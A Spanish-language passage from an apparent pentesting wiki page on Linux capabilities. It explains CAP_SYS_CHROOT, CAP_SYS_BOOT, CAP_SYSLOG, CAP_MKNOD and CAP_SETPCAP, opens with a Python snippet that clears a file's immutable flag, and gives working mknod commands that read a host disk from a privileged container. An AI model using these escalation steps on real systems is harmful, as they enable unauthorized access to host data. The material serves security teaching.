fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Ten en cuenta que normalmente este atributo inmutable se establece y elimina usando:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) habilita la ejecución de la llamada al sistema `chroot(2)`, lo que potencialmente puede permitir escapar de entornos `chroot(2)` a través de vulnerabilidades conocidas:

* [Cómo escapar de varias soluciones de chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: herramienta de escape de chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) no solo permite la ejecución de la llamada al sistema `reboot(2)` para reinicios del sistema, incluyendo comandos específicos como `LINUX_REBOOT_CMD_RESTART2` adaptados para ciertas plataformas de hardware, sino que también habilita el uso de `kexec_load(2)` y, a partir de Linux 3.17, `kexec_file_load(2)` para cargar nuevos núcleos de fallo o firmados respectivamente.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) se separó del más amplio **CAP_SYS_ADMIN** en Linux 2.6.37, otorgando específicamente la capacidad de utilizar la llamada `syslog(2)`. Esta capacidad permite ver direcciones del kernel a través de `/proc` y interfaces similares cuando el ajuste `kptr_restrict` está en 1, lo que controla la exposición de direcciones del kernel. Desde Linux 2.6.39, el valor predeterminado para `kptr_restrict` es 0, lo que significa que las direcciones del kernel están expuestas, aunque muchas distribuciones lo establecen en 1 (ocultar direcciones excepto para uid 0) o 2 (ocultar siempre direcciones) por razones de seguridad.

Además, **CAP_SYSLOG** permite acceder a la salida de `dmesg` cuando `dmesg_restrict` está configurado en 1. A pesar de estos cambios, **CAP_SYS_ADMIN** conserva la capacidad de realizar operaciones de `syslog` debido a precedentes históricos.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) extiende la funcionalidad de la llamada al sistema `mknod` más allá de la creación de archivos regulares, FIFOs (tubos con nombre) o sockets de dominio UNIX. Específicamente permite la creación de archivos especiales, que incluyen:

- **S_IFCHR**: Archivos especiales de caracteres, que son dispositivos como terminales.
- **S_IFBLK**: Archivos especiales de bloques, que son dispositivos como discos.

Esta capacidad es esencial para procesos que requieren la capacidad de crear archivos de dispositivo, facilitando la interacción directa con hardware a través de dispositivos de caracteres o bloques.

Es una capacidad predeterminada de Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Esta capacidad permite realizar escaladas de privilegios (a través de lectura completa del disco) en el host, bajo estas condiciones:

1. Tener acceso inicial al host (sin privilegios).
2. Tener acceso inicial al contenedor (con privilegios (EUID 0) y capacidad efectiva `CAP_MKNOD`).
3. El host y el contenedor deben compartir el mismo espacio de nombres de usuario.

**Pasos para Crear y Acceder a un Dispositivo de Bloque en un Contenedor:**

1. **En el Host como Usuario Estándar:**
- Determine su ID de usuario actual con `id`, por ejemplo, `uid=1000(standarduser)`.
- Identifique el dispositivo objetivo, por ejemplo, `/dev/sdb`.

2. **Dentro del Contenedor como `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **De vuelta en el Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
### CAP\_SETPCAP

**CAP_SETPCAP** permite a un proceso **alterar los conjuntos de capacidades** de otro proceso, permitiendo la adición o eliminación de capacidades de los conjuntos efectivos, heredables y permitidos. Sin embargo, un proceso solo puede modificar capacidades que posee en su propio conjunto permitido, asegurando que no puede elevar los privilegios de otro proceso más allá de los suyos. Actualizaciones recientes del kernel han reforzado estas reglas, restringiendo `CAP_SETPCAP` para disminuir solo las capacidades dentro de su propio conjunto permitido o el de sus descendientes, con el objetivo de mitigar riesgos de seguridad. Su uso requiere tener `CAP_SETPCAP` en el conjunto efectivo y las capacidades objetivo en el conjunto permitido, utilizando `capset()` para las modificaciones. Esto resume la función principal y limitaciones de `CAP_SETPCAP`, resaltando su papel en la gestión de privilegios y mejora de la seguridad.
